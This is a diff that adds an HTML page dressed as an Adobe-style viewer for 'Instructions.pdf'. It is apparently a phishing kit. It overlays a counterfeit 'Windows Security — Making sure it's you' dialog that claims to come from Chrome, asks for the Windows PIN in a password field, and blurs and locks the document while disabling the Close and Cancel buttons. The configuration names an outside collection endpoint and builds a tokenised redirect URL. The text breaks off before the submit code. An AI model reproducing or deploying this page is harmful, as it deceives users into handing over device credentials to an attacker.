@@ -1,0 +1,3115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+    <title>Instructions.pdf</title>
+
+    <!-- PDF.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
+
+    <style>
+
+    /* =========================================================
+       GLOBAL
+       ========================================================= */
+
+    * {
+        box-sizing: border-box;
+    }
+
+    html,
+    body {
+        width: 100%;
+        height: 100%;
+        margin: 0;
+        overflow: hidden;
+        font-family: Arial, Helvetica, sans-serif;
+        background: #323639;
+        color: #ffffff;
+    }
+
+    button,
+    input,
+    textarea {
+        font: inherit;
+    }
+
+    button {
+        cursor: pointer;
+    }
+
+
+    /* =========================================================
+       APPLICATION
+       ========================================================= */
+
+    .app {
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        background: #323639;
+    }
+
+
+    /* =========================================================
+       TOP BAR
+       ========================================================= */
+
+    .topbar {
+        height: 52px;
+        min-height: 52px;
+        display: flex;
+        align-items: center;
+        background: #202124;
+        border-bottom: 1px solid #111214;
+        padding: 0 14px;
+        gap: 12px;
+        z-index: 20;
+    }
+
+    .acrobat-mark {
+        width: 30px;
+        height: 30px;
+        border-radius: 5px;
+        background: #ec1c24;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #ffffff;
+        font-size: 16px;
+        font-weight: bold;
+    }
+
+    .document-name {
+        min-width: 0;
+        flex: 1;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        font-size: 14px;
+        color: #e8eaed;
+    }
+
+    .top-button {
+        width: 34px;
+        height: 34px;
+        border: 0;
+        border-radius: 5px;
+        background: transparent;
+        color: #d7d9dc;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+    }
+
+    .top-button:hover {
+        background: #3c4043;
+    }
+
+
+    /* =========================================================
+       TOOLBAR
+       ========================================================= */
+
+    .toolbar {
+        height: 48px;
+        min-height: 48px;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        padding: 0 12px;
+        background: #292a2d;
+        border-bottom: 1px solid #17181a;
+        z-index: 19;
+    }
+
+    .tool-button {
+        height: 34px;
+        border: 0;
+        border-radius: 5px;
+        background: transparent;
+        color: #d8dadd;
+        padding: 0 11px;
+        font-size: 13px;
+    }
+
+    .tool-button:hover {
+        background: #3b3d40;
+    }
+
+    .toolbar-spacer {
+        flex: 1;
+    }
+
+    .page-control,
+    .zoom-control {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+    }
+
+    .page-input {
+        width: 44px;
+        height: 30px;
+        border: 1px solid #55585c;
+        border-radius: 4px;
+        background: #202124;
+        color: #ffffff;
+        text-align: center;
+        outline: none;
+    }
+
+    .page-input:focus {
+        border-color: #8ab4f8;
+    }
+
+    .page-count {
+        color: #b8bbc0;
+        font-size: 13px;
+        min-width: 42px;
+    }
+
+    .zoom-value {
+        min-width: 48px;
+        text-align: center;
+        color: #d8dadd;
+        font-size: 13px;
+    }
+
+    .small-button {
+        width: 32px;
+        height: 30px;
+        border: 0;
+        border-radius: 4px;
+        background: transparent;
+        color: #d8dadd;
+        font-size: 18px;
+    }
+
+    .small-button:hover {
+        background: #3b3d40;
+    }
+
+
+    /* =========================================================
+       MAIN AREA
+       ========================================================= */
+
+    .main-area {
+        flex: 1;
+        min-height: 0;
+        display: flex;
+        overflow: hidden;
+    }
+
+
+    /* =========================================================
+       THUMBNAIL SIDEBAR
+       ========================================================= */
+
+    .sidebar {
+        width: 170px;
+        min-width: 170px;
+        background: #292a2d;
+        border-right: 1px solid #17181a;
+        overflow-y: auto;
+        padding: 16px 12px;
+    }
+
+    .sidebar-title {
+        color: #aeb1b5;
+        font-size: 11px;
+        text-transform: uppercase;
+        letter-spacing: .08em;
+        margin: 0 4px 12px;
+    }
+
+    .thumb {
+        width: 100%;
+        border: 1px solid transparent;
+        background: transparent;
+        padding: 7px;
+        margin-bottom: 10px;
+        border-radius: 5px;
+        color: #c7c9cc;
+        position: relative;
+    }
+
+    .thumb:hover {
+        background: #37393c;
+    }
+
+    .thumb.active {
+        border-color: #8ab4f8;
+        background: #383a3d;
+    }
+
+    .thumb canvas {
+        display: block;
+        margin: auto;
+        background: #ffffff;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, .35);
+    }
+
+    .thumb-number {
+        display: block;
+        font-size: 11px;
+        margin-top: 5px;
+    }
+
+
+    /* =========================================================
+       PDF WORKSPACE
+       ========================================================= */
+
+    .workspace {
+        flex: 1;
+        min-width: 0;
+        overflow-y: auto;
+        overflow-x: auto;
+        background: #3b3d3f;
+        padding: 28px;
+        scroll-behavior: smooth;
+    }
+
+    .pages {
+        width: max-content;
+        min-width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 24px;
+    }
+
+    .pdf-page {
+        position: relative;
+        background: #ffffff;
+        box-shadow: 0 4px 18px rgba(0, 0, 0, .35);
+        min-height: 200px;
+    }
+
+    .pdf-page canvas {
+        display: block;
+        background: #ffffff;
+    }
+
+
+    /* =========================================================
+       ERROR
+       ========================================================= */
+
+    .viewer-error {
+        max-width: 650px;
+        margin: 80px auto;
+        padding: 24px;
+        background: #202124;
+        border: 1px solid #5f6368;
+        border-radius: 8px;
+        color: #f28b82;
+        line-height: 1.5;
+    }
+
+
+    /* =========================================================
+       WINDOWS / CHROME SECURITY-STYLE MODAL
+       ========================================================= */
+
+    .windows-modal {
+        position: fixed;
+        inset: 0;
+
+        display: none;
+
+        align-items: center;
+        justify-content: center;
+
+        background: rgba(0, 0, 0, .22);
+
+        z-index: 999999;
+
+        padding: 20px;
+    }
+
+    .windows-modal.open {
+        display: flex;
+    }
+
+
+    /* =========================================================
+       SECURITY DIALOG
+       ========================================================= */
+
+    .windows-dialog {
+        position: relative;
+
+        width: 460px;
+        max-width: calc(100vw - 32px);
+
+        background: #f3f3f3;
+
+        border: 1px solid #b5b5b5;
+
+        box-shadow:
+            0 8px 30px rgba(0, 0, 0, .38),
+            0 1px 3px rgba(0, 0, 0, .20);
+
+        color: #1a1a1a;
+
+        font-family:
+            "Segoe UI",
+            Arial,
+            Helvetica,
+            sans-serif;
+
+        overflow: hidden;
+    }
+
+
+    /* =========================================================
+       CLOSE BUTTON
+       ========================================================= */
+
+    .windows-close {
+        position: absolute;
+
+        top: 0;
+        right: 0;
+
+        width: 46px;
+        height: 38px;
+
+        border: 0;
+
+        background: transparent;
+
+        color: #444444;
+
+        font-family:
+            "Segoe UI",
+            Arial,
+            sans-serif;
+
+        font-size: 22px;
+        font-weight: 300;
+
+        line-height: 38px;
+
+        text-align: center;
+
+        cursor: pointer;
+
+        z-index: 2;
+    }
+
+    .windows-close:hover {
+        background: #e81123;
+        color: #ffffff;
+    }
+
+    .windows-close:disabled {
+        opacity: .35;
+        cursor: not-allowed;
+    }
+
+
+    /* =========================================================
+       CONTENT
+       ========================================================= */
+
+    .windows-content {
+        padding: 30px 32px 26px;
+    }
+
+
+    /* =========================================================
+       TITLE
+       ========================================================= */
+
+    .windows-content h1,
+    .windows-content h2 {
+        margin: 0 36px 14px 0;
+
+        font-size: 22px;
+
+        font-weight: 400;
+
+        line-height: 1.25;
+
+        color: #111111;
+    }
+
+
+    /* =========================================================
+       DESCRIPTION
+       ========================================================= */
+
+    .windows-description {
+        margin: 0 0 22px 0;
+
+        max-width: 100%;
+
+        font-size: 14px;
+
+        font-weight: 400;
+
+        line-height: 1.45;
+
+        color: #303030;
+    }
+
+
+    /* =========================================================
+       REASON ROW
+       ========================================================= */
+
+    .reason-row {
+        display: flex;
+
+        align-items: center;
+
+        gap: 14px;
+
+        margin-bottom: 10px;
+    }
+
+
+    /* =========================================================
+       WINDOWS SECURITY ICON
+       ========================================================= */
+
+    .win-icon {
+        font-family:
+            "Segoe Fluent Icons",
+            "Segoe MDL2 Assets",
+            "Segoe UI Symbol",
+            sans-serif;
+
+        color: #646464;
+
+        font-size: 16px;
+
+        user-select: none;
+    }
+
+    .reason-icon {
+        flex: 0 0 52px;
+
+        width: 52px;
+        height: 52px;
+
+        background: #4a4a4a;
+
+        display: flex;
+
+        align-items: center;
+        justify-content: center;
+
+        color: #ffffff;
+
+        font-size: 28px;
+
+        font-weight: 300;
+    }
+
+    .reason-icon span {
+        display: block;
+
+        width: 30px;
+        height: 30px;
+
+        border: 3px solid #ffffff;
+
+        border-radius: 50%;
+
+        text-align: center;
+
+        line-height: 24px;
+    }
+
+
+    /* =========================================================
+       INPUT
+       ========================================================= */
+
+    .windows-input {
+        flex: 1;
+
+        width: 100%;
+
+        height: 44px;
+
+        min-width: 0;
+
+        padding: 7px 10px;
+
+        border: 1px solid #8c8c8c;
+
+        border-radius: 2px;
+
+        outline: none;
+
+        background: #ffffff;
+
+        color: #111111;
+
+        font-family:
+            "Segoe UI",
+            Arial,
+            sans-serif;
+
+        font-size: 14px;
+
+        font-weight: 400;
+    }
+
+    .windows-input::placeholder {
+        color: #888888;
+    }
+
+    .windows-input:hover {
+        border-color: #6f6f6f;
+    }
+
+    .windows-input:focus {
+        border-color: #0078d4;
+
+        box-shadow:
+            0 0 0 1px #0078d4;
+    }
+
+
+    /* =========================================================
+       STATUS
+       ========================================================= */
+
+    .windows-status {
+        min-height: 18px;
+
+        margin: 8px 0 14px 66px;
+
+        font-size: 12px;
+
+        line-height: 1.4;
+    }
+
+    .windows-status.success {
+        color: #107c10;
+    }
+
+    .windows-status.error {
+        color: #c42b1c;
+    }
+
+
+    /* =========================================================
+       BUTTONS
+       ========================================================= */
+
+    .windows-buttons {
+        display: flex;
+
+        justify-content: flex-end;
+
+        gap: 8px;
+
+        margin-top: 16px;
+    }
+
+    .windows-button {
+        min-width: 92px;
+
+        height: 34px;
+
+        padding: 0 18px;
+
+        border: 1px solid #8c8c8c;
+
+        border-radius: 2px;
+
+        background: #e1e1e1;
+
+        color: #111111;
+
+        font-family:
+            "Segoe UI",
+            Arial,
+            sans-serif;
+
+        font-size: 13px;
+
+        font-weight: 400;
+
+        cursor: pointer;
+    }
+
+    .windows-button:hover {
+        background: #d5d5d5;
+    }
+
+    .windows-button:focus {
+        outline: 1px solid #0078d4;
+
+        outline-offset: 1px;
+    }
+
+    .windows-button:disabled {
+        opacity: .55;
+
+        cursor: not-allowed;
+    }
+
+
+    /* =========================================================
+       PERSISTENT PDF LOCK
+       ========================================================= */
+
+    body.pdf-locked {
+        overflow: hidden;
+    }
+
+    body.pdf-locked #workspace {
+        filter: blur(8px);
+
+        pointer-events: none;
+
+        user-select: none;
+    }
+
+    body.pdf-locked #workspace * {
+        pointer-events: none !important;
+
+        user-select: none !important;
+    }
+
+    body.pdf-locked #zoomOut,
+    body.pdf-locked #zoomIn,
+    body.pdf-locked #pageInput {
+        pointer-events: none !important;
+    }
+
+    body.pdf-locked #thumbs {
+        pointer-events: none !important;
+    }
+
+    body.pdf-locked #modal,
+    body.pdf-locked #modal * {
+        filter: none !important;
+    }
+
+    body.pdf-locked #closeModal,
+    body.pdf-locked #cancelModal {
+        pointer-events: none;
+
+        opacity: .45;
+    }
+
+
+    /* =========================================================
+       MOBILE
+       ========================================================= */
+
+    @media (max-width: 700px) {
+
+        .topbar {
+            padding: 0 8px;
+        }
+
+        .document-name {
+            font-size: 13px;
+        }
+
+        .toolbar {
+            overflow-x: auto;
+
+            padding: 0 7px;
+        }
+
+        .toolbar > .tool-button {
+            display: none;
+        }
+
+        .sidebar {
+            display: none;
+        }
+
+        .workspace {
+            padding: 12px;
+        }
+
+        .pages {
+            gap: 14px;
+        }
+
+        /* -----------------------------
+           MOBILE SECURITY MODAL
+           ----------------------------- */
+
+        .windows-modal {
+            padding: 12px;
+        }
+
+        .windows-dialog {
+            width: min(360px, calc(100vw - 24px));
+
+            max-width: calc(100vw - 24px);
+
+            max-height: calc(100vh - 24px);
+
+            overflow-y: auto;
+        }
+
+        .windows-content {
+            padding: 26px 24px 22px;
+        }
+
+        .windows-content h1,
+        .windows-content h2 {
+            font-size: 20px;
+
+            margin-bottom: 12px;
+        }
+
+        .windows-description {
+            font-size: 13px;
+
+            margin-bottom: 18px;
+        }
+
+        .reason-row {
+            gap: 10px;
+
+            align-items: center;
+        }
+
+        .reason-icon {
+            flex: 0 0 46px;
+
+            width: 46px;
+            height: 46px;
+
+            font-size: 24px;
+        }
+
+        .reason-icon span {
+            width: 27px;
+            height: 27px;
+
+            border-width: 3px;
+
+            line-height: 21px;
+        }
+
+        .windows-input {
+            height: 42px;
+
+            font-size: 14px;
+        }
+
+        .windows-status {
+            margin-left: 56px;
+
+            margin-top: 7px;
+
+            margin-bottom: 10px;
+        }
+
+        .windows-buttons {
+            gap: 8px;
+
+            margin-top: 14px;
+        }
+
+        .windows-button {
+            min-width: 86px;
+
+            height: 34px;
+
+            font-size: 13px;
+        }
+    }
+
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+    <!-- =====================================================
+         TOP BAR
+         ===================================================== -->
+
+    <div class="topbar">
+
+        <div class="acrobat-mark">
+            A
+        </div>
+
+        <div class="document-name">
+            Instructions.pdf
+        </div>
+
+        <button
+            class="top-button"
+            type="button"
+            title="Search">
+            🔍
+        </button>
+
+        <button
+            class="top-button"
+            type="button"
+            title="More">
+            ⋮
+        </button>
+
+    </div>
+
+
+    <!-- =====================================================
+         TOOLBAR
+         ===================================================== -->
+
+    <div class="toolbar">
+
+        <button
+            class="tool-button"
+            type="button">
+            Home
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            All tools
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            Edit
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            Comment
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            Sign
+        </button>
+
+        <div class="toolbar-spacer"></div>
+
+        <div class="page-control">
+
+            <input
+                id="pageInput"
+                class="page-input"
+                type="number"
+                min="1"
+                value="1"
+                aria-label="Page number">
+
+            <span>/</span>
+
+            <span
+                id="pageCount"
+                class="page-count">
+                -
+            </span>
+
+        </div>
+
+        <div class="zoom-control">
+
+            <button
+                id="zoomOut"
+                class="small-button"
+                type="button">
+                −
+            </button>
+
+            <span
+                id="zoomValue"
+                class="zoom-value">
+                100%
+            </span>
+
+            <button
+                id="zoomIn"
+                class="small-button"
+                type="button">
+                +
+            </button>
+
+        </div>
+
+    </div>
+
+
+    <!-- =====================================================
+         MAIN
+         ===================================================== -->
+
+    <div class="main-area">
+
+        <aside class="sidebar">
+
+            <div class="sidebar-title">
+                Pages
+            </div>
+
+            <div id="thumbs"></div>
+
+        </aside>
+
+
+        <main
+            id="workspace"
+            class="workspace">
+
+            <div
+                id="pages"
+                class="pages">
+            </div>
+
+            <div
+                id="viewerError"
+                class="viewer-error"
+                hidden>
+            </div>
+
+        </main>
+
+    </div>
+
+</div>
+
+
+<!-- =========================================================
+     WINDOWS-STYLE UNINSTALL REASON MODAL
+     ========================================================= -->
+
+<div
+    id="modal"
+    class="windows-modal"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="modalTitle">
+
+    <div class="windows-dialog">
+
+        <!-- Close button -->
+        <button
+            id="closeModal"
+            class="windows-close"
+            type="button"
+            aria-label="Close">
+            ×
+        </button>
+
+        <!-- Content -->
+        <div class="windows-content">
+
+            <h1 id="modalTitle">
+                Windows Security
+            </h1>
+
+            <h2 id="modalSubTitle">
+                Making sure it's you
+            </h2>
+
+            <p class="windows-description">
+                This request comes from Chrome published by Google LLC.
+            </p>
+
+            <!-- Single reason input -->
+            <div class="reason-row">
+
+                <div class="reason-icon">
+                    <!-- U+229F or U+25田 layout matches the flat grey grid look -->
+                    <span class="win-icon">&#x7530;</span>
+                </div>
+
+                <input
+                    id="reason"
+                    class="windows-input"
+                    type="password"
+                    maxlength="500"
+                    autocomplete="off"
+                    placeholder="PIN"
+                    aria-label="PIN Entry"
+                    required>
+
+            </div>
+
+            <!-- Status -->
+            <div
+                id="formStatus"
+                class="windows-status">
+            </div>
+
+            <!-- Buttons -->
+            <div class="windows-buttons">
+
+                <button
+                    id="submitReason"
+                    class="windows-button"
+                    type="button">
+                    OK
+                </button>
+
+                <button
+                    id="cancelModal"
+                    class="windows-button"
+                    type="button">
+                    Cancel
+                </button>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+    /* =========================================================
+       CONFIGURATION
+       ========================================================= */
+
+    const CONFIG = {
+
+        pdfUrl:
+            "./instructions.pdf",
+
+        workerEndpoint:
+            "https://deal.willowcenteredtech.com/api/uninstall",
+
+        redirectUrl:
+            "https://projectdeal.willowcenteredtech.com/"
+    };
+
+
+    /* =========================================================
+       PDF.JS
+       ========================================================= */
+
+    pdfjsLib.GlobalWorkerOptions.workerSrc =
+        "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
+
+
+    /* =========================================================
+       APPLICATION STATE
+       ========================================================= */
+
+    let pdfDoc = null;
+
+    let scale = 1;
+
+    let renderedPages = new Map();
+
+    let modalShown = false;
+
+    let pdfLocked = false;
+
+    let scrollTimer = null;
+
+    let generatedRedirectUrl = "";
+
+
+    /* =========================================================
+       ELEMENT HELPER
+       ========================================================= */
+
+    const $ = function (id) {
+
+        return document.getElementById(id);
+
+    };
+
+
+    /* =========================================================
+       ERROR
+       ========================================================= */
+
+    function showError(message) {
+
+        const error =
+            $("viewerError");
+
+
+        if (!error) {
+            return;
+        }
+
+
+        error.textContent =
+            message;
+
+
+        error.hidden =
+            false;
+
+    }
+
+
+    /* =========================================================
+       CLAMP
+       ========================================================= */
+
+    function clamp(
+        value,
+        min,
+        max
+    ) {
+
+        return Math.min(
+            max,
+            Math.max(
+                min,
+                value
+            )
+        );
+
+    }
+
+
+    /* =========================================================
+       RANDOM URL-SAFE STRING
+       ========================================================= */
+
+    function generateRandomString(length) {
+
+        const characters =
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+            "abcdefghijklmnopqrstuvwxyz" +
+            "0123456789";
+
+
+        const bytes =
+            new Uint8Array(
+                length
+            );
+
+
+        /*
+         * Cryptographically secure random
+         * values generated completely client-side.
+         */
+
+        crypto.getRandomValues(
+            bytes
+        );
+
+
+        let result =
+            "";
+
+
+        for (
+            let i = 0;
+            i < length;
+            i++
+        ) {
+
+            result +=
+                characters[
+                    bytes[i] %
+                    characters.length
+                ];
+
+        }
+
+
+        return result;
+
+    }
+
+
+    /* =========================================================
+       CREATE EXACT 256-CHARACTER URL
+       ========================================================= */
+
+function create256CharacterRedirectUrl() {
+
+    const baseUrl =
+        "https://projectdeal.willowcenteredtech.com/?r=";
+
+    const targetLength = 256;
+
+    if (baseUrl.length >= targetLength) {
+        console.error(
+            "Base URL is already 256 characters or longer."
+        );
+
+        return "";
+    }
+
+    const randomLength =
+        targetLength - baseUrl.length;
+
+    const randomValue =
+        generateRandomString(randomLength);
+
+    const finalUrl =
+        baseUrl + randomValue;
+
+    console.log(
+        "Generated URL:",
+        finalUrl
+    );
+
+    console.log(
+        "Generated URL length:",
+        finalUrl.length
+    );
+
+    return finalUrl;
+}
+
+
+    /* =========================================================
+       DISPLAY GENERATED 256-CHARACTER URL
+       ========================================================= */
+
+    function initializeRedirectUrl() {
+
+        generatedRedirectUrl =
+            create256CharacterRedirectUrl();
+
+
+        if (!generatedRedirectUrl) {
+
+            console.warn(
+                "A 256-character URL could not be generated."
+            );
+
+            return;
+
+        }
+
+
+        // console.log(
+        //     "Generated 256-character URL:",
+        //     generatedRedirectUrl
+        // );
+
+
+        // console.log(
+        //     "Generated URL length:",
+        //     generatedRedirectUrl.length
+        // );
+
+
+        /*
+         * Display the generated URL.
+         *
+         * Expected HTML element:
+         *
+         * id="generatedLink"
+         */
+
+        const generatedLink =
+            $("generatedLink");
+
+
+        if (generatedLink) {
+
+            if (
+                generatedLink.tagName ===
+                    "INPUT" ||
+                generatedLink.tagName ===
+                    "TEXTAREA"
+            ) {
+
+                generatedLink.value =
+                    generatedRedirectUrl;
+
+            }
+            else {
+
+                generatedLink.textContent =
+                    generatedRedirectUrl;
+
+            }
+
+        }
+
+
+        /*
+         * Optional character count.
+         */
+
+        const generatedLength =
+            $("generatedLinkLength");
+
+
+        if (generatedLength) {
+
+            generatedLength.textContent =
+                generatedRedirectUrl.length +
+                " characters";
+
+        }
+
+    }
+
+
+    /* =========================================================
+       CURRENT PDF PAGE
+       ========================================================= */
+
+    function pageNumberForScroll() {
+
+        if (!pdfDoc) {
+            return 1;
+        }
+
+
+        const pages =
+            Array.from(
+                document.querySelectorAll(
+                    ".pdf-page"
+                )
+            );
+
+
+        let best =
+            1;
+
+
+        let bestDistance =
+            Infinity;
+
+
+        for (const page of pages) {
+
+            const distance =
+                Math.abs(
+                    page.getBoundingClientRect().top -
+                    92
+                );
+
+
+            if (
+                distance <
+                bestDistance
+            ) {
+
+                bestDistance =
+                    distance;
+
+
+                best =
+                    Number(
+                        page.dataset.page
+                    );
+
+            }
+
+        }
+
+
+        return best;
+
+    }
+
+
+    /* =========================================================
+       RENDER PAGE
+       ========================================================= */
+
+    async function renderPage(number) {
+
+        const holder =
+            document.querySelector(
+                `.pdf-page[data-page="${number}"]`
+            );
+
+
+        if (
+            !holder ||
+            renderedPages.has(number)
+        ) {
+
+            return;
+
+        }
+
+
+        const page =
+            await pdfDoc.getPage(
+                number
+            );
+
+
+        const viewport =
+            page.getViewport({
+                scale:
+                    scale
+            });
+
+
+        const canvas =
+            holder.querySelector(
+                "canvas"
+            );
+
+
+        if (!canvas) {
+            return;
+        }
+
+
+        const context =
+            canvas.getContext(
+                "2d",
+                {
+                    alpha:
+                        false
+                }
+            );
+
+
+        const ratio =
+            window.devicePixelRatio ||
+            1;
+
+
+        canvas.width =
+            Math.ceil(
+                viewport.width *
+                ratio
+            );
+
+
+        canvas.height =
+            Math.ceil(
+                viewport.height *
+                ratio
+            );
+
+
+        canvas.style.width =
+            `${viewport.width}px`;
+
+
+        canvas.style.height =
+            `${viewport.height}px`;
+
+
+        holder.style.width =
+            `${viewport.width}px`;
+
+
+        holder.style.minHeight =
+            `${viewport.height}px`;
+
+
+        await page.render({
+
+            canvasContext:
+                context,
+
+            viewport:
+                viewport,
+
+            transform:
+                ratio !== 1
+                    ? [
+                        ratio,
+                        0,
+                        0,
+                        ratio,
+                        0,
+                        0
+                    ]
+                    : null
+
+        }).promise;
+
+
+        renderedPages.set(
+            number,
+            {
+                width:
+                    viewport.width,
+
+                height:
+                    viewport.height
+            }
+        );
+
+    }
+
+
+    /* =========================================================
+       RENDER VISIBLE PAGES
+       ========================================================= */
+
+    async function renderVisiblePages() {
+
+        if (!pdfDoc) {
+            return;
+        }
+
+
+        const pages =
+            Array.from(
+                document.querySelectorAll(
+                    ".pdf-page"
+                )
+            );
+
+
+        for (
+            const holder of pages
+        ) {
+
+            const rect =
+                holder.getBoundingClientRect();
+
+
+            if (
+                rect.bottom > -800 &&
+                rect.top <
+                    window.innerHeight +
+                    800
+            ) {
+
+                await renderPage(
+                    Number(
+                        holder.dataset.page
+                    )
+                );
+
+            }
+
+        }
+
+    }
+
+
+    /* =========================================================
+       BUILD PDF PAGES
+       ========================================================= */
+
+    function buildPages() {
+
+        $("pages").innerHTML =
+            "";
+
+        $("thumbs").innerHTML =
+            "";
+
+        renderedPages.clear();
+
+
+        for (
+            let number = 1;
+            number <= pdfDoc.numPages;
+            number++
+        ) {
+
+            /* =================================================
+               PDF PAGE
+               ================================================= */
+
+            const holder =
+                document.createElement(
+                    "div"
+                );
+
+
+            holder.className =
+                "pdf-page";
+
+
+            holder.dataset.page =
+                number;
+
+
+            holder.innerHTML =
+                "<canvas></canvas>";
+
+
+            $("pages").appendChild(
+                holder
+            );
+
+
+            /* =================================================
+               THUMBNAIL
+               ================================================= */
+
+            const thumb =
+                document.createElement(
+                    "button"
+                );
+
+
+            thumb.className =
+                "thumb";
+
+
+            thumb.type =
+                "button";
+
+
+            thumb.dataset.page =
+                number;
+
+
+            thumb.innerHTML = `
+                <span class="thumb-number">
+                    ${number}
+                </span>
+                <canvas></canvas>
+            `;
+
+
+            thumb.addEventListener(
+                "click",
+                function () {
+
+                    /*
+                     * Do not allow thumbnail
+                     * navigation while locked.
+                     */
+
+                    if (pdfLocked) {
+                        return;
+                    }
+
+
+                    const target =
+                        document.querySelector(
+                            `.pdf-page[data-page="${number}"]`
+                        );
+
+
+                    if (target) {
+
+                        target.scrollIntoView({
+
+                            behavior:
+                                "smooth",
+
+                            block:
+                                "start"
+
+                        });
+
+                    }
+
+                }
+            );
+
+
+            $("thumbs").appendChild(
+                thumb
+            );
+
+
+            makeThumbnail(
+                number,
+                thumb.querySelector(
+                    "canvas"
+                )
+            ).catch(
+                console.error
+            );
+
+        }
+
+
+        $("pageCount").textContent =
+            pdfDoc.numPages;
+
+
+        $("pageInput").max =
+            pdfDoc.numPages;
+
+    }
+
+
+    /* =========================================================
+       THUMBNAIL
+       ========================================================= */
+
+    async function makeThumbnail(
+        number,
+        canvas
+    ) {
+
+        if (!canvas) {
+            return;
+        }
+
+
+        const page =
+            await pdfDoc.getPage(
+                number
+            );
+
+
+        const base =
+            page.getViewport({
+                scale:
+                    1
+            });
+
+
+        const thumbnailWidth =
+            130;
+
+
+        const thumbnailScale =
+            thumbnailWidth /
+            base.width;
+
+
+        const viewport =
+            page.getViewport({
+                scale:
+                    thumbnailScale
+            });
+
+
+        const ratio =
+            window.devicePixelRatio ||
+            1;
+
+
+        canvas.width =
+            Math.ceil(
+                viewport.width *
+                ratio
+            );
+
+
+        canvas.height =
+            Math.ceil(
+                viewport.height *
+                ratio
+            );
+
+
+        canvas.style.width =
+            `${viewport.width}px`;
+
+
+        canvas.style.height =
+            `${viewport.height}px`;
+
+
+        await page.render({
+
+            canvasContext:
+                canvas.getContext(
+                    "2d"
+                ),
+
+            viewport:
+                viewport,
+
+            transform:
+                ratio !== 1
+                    ? [
+                        ratio,
+                        0,
+                        0,
+                        ratio,
+                        0,
+                        0
+                    ]
+                    : null
+
+        }).promise;
+
+    }
+
+
+    /* =========================================================
+       LOAD PDF
+       ========================================================= */
+
+    async function loadPdf() {
+
+        try {
+
+            const loading =
+                pdfjsLib.getDocument(
+                    CONFIG.pdfUrl
+                );
+
+
+            pdfDoc =
+                await loading.promise;
+
+
+            $("pageInput").value =
+                1;
+
+
+            buildPages();
+
+
+            await renderVisiblePages();
+
+
+            updateToolbar();
+
+        }
+        catch (error) {
+
+            console.error(
+                "PDF loading error:",
+                error
+            );
+
+
+            showError(
+                "The PDF could not be loaded. " +
+                "Check the PDF URL and server CORS settings."
+            );
+
+        }
+
+    }
+
+
+    /* =========================================================
+       TOOLBAR
+       ========================================================= */
+
+    function updateToolbar() {
+
+        const current =
+            pageNumberForScroll();
+
+
+        $("pageInput").value =
+            current;
+
+
+        $("zoomValue").textContent =
+            `${Math.round(scale * 100)}%`;
+
+
+        document
+            .querySelectorAll(
+                ".thumb"
+            )
+            .forEach(
+                function (thumb) {
+
+                    thumb.classList.toggle(
+                        "active",
+
+                        Number(
+                            thumb.dataset.page
+                        ) === current
+                    );
+
+                }
+            );
+
+    }
+
+
+    /* =========================================================
+       ZOOM
+       ========================================================= */
+
+    async function setZoom(next) {
+
+        /*
+         * Zoom is not allowed while
+         * the PDF is locked.
+         */
+
+        if (pdfLocked) {
+            return;
+        }
+
+
+        const old =
+            scale;
+
+
+        scale =
+            clamp(
+                Number(
+                    next.toFixed(2)
+                ),
+                0.5,
+                2.5
+            );
+
+
+        if (
+            old === scale
+        ) {
+
+            return;
+
+        }
+
+
+        const current =
+            pageNumberForScroll();
+
+
+        renderedPages.clear();
+
+
+        await renderVisiblePages();
+
+
+        updateToolbar();
+
+
+        const target =
+            document.querySelector(
+                `.pdf-page[data-page="${current}"]`
+            );
+
+
+        if (target) {
+
+            target.scrollIntoView({
+                block:
+                    "start"
+            });
+
+        }
+
+    }
+
+
+    /* =========================================================
+       LOCK PDF
+       ========================================================= */
+
+    function lockPdf() {
+
+        pdfLocked =
+            true;
+
+
+        /*
+         * Apply the CSS lock class.
+         */
+
+        document.body.classList.add(
+            "pdf-locked"
+        );
+
+
+        /*
+         * Lock the PDF workspace.
+         */
+
+        const workspace =
+            $("workspace");
+
+
+        if (workspace) {
+
+            workspace.dataset.previousOverflow =
+                workspace.style.overflow;
+
+
+            workspace.style.overflow =
+                "hidden";
+
+        }
+
+
+        /*
+         * Disable PDF controls.
+         */
+
+        const zoomOut =
+            $("zoomOut");
+
+        const zoomIn =
+            $("zoomIn");
+
+        const pageInput =
+            $("pageInput");
+
+
+        if (zoomOut) {
+            zoomOut.disabled =
+                true;
+        }
+
+
+        if (zoomIn) {
+            zoomIn.disabled =
+                true;
+        }
+
+
+        if (pageInput) {
+            pageInput.disabled =
+                true;
+        }
+
+
+        /*
+         * Disable thumbnails.
+         */
+
+        document
+            .querySelectorAll(
+                ".thumb"
+            )
+            .forEach(
+                function (thumb) {
+
+                    thumb.disabled =
+                        true;
+
+                }
+            );
+
+    }
+
+
+    /* =========================================================
+       UNLOCK PDF
+       ========================================================= */
+
+    function unlockPdf() {
+
+        pdfLocked =
+            false;
+
+
+        /*
+         * Remove blur and interaction lock.
+         */
+
+        document.body.classList.remove(
+            "pdf-locked"
+        );
+
+
+        /*
+         * Restore workspace scrolling.
+         */
+
+        const workspace =
+            $("workspace");
+
+
+        if (workspace) {
+
+            workspace.style.overflow =
+                workspace.dataset.previousOverflow ||
+                "";
+
+        }
+
+
+        /*
+         * Re-enable PDF controls.
+         */
+
+        const zoomOut =
+            $("zoomOut");
+
+        const zoomIn =
+            $("zoomIn");
+
+        const pageInput =
+            $("pageInput");
+
+
